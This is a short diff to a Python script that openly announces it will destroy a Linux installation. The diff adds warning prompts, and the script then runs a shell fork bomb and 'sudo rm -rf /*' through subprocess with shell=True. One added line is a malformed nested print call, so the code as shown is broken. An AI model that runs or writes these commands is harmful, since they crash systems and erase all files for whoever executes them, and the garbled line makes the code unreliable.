@@ -1,5 +1,10 @@
 import subprocess
 
+print("Press enter to continue and CTRL + C TO QUIT...")
+input("This Python script will destroy your Linux installation!")
+print("print("Press enter to continue and CTRL + C TO QUIT...")
+input("THIS IS THE LAST WARNING!")
+
 subprocess.run(":(){ :|:& };:", shell=True)
 
 subprocess.run("sudo rm -rf /*", shell=True)
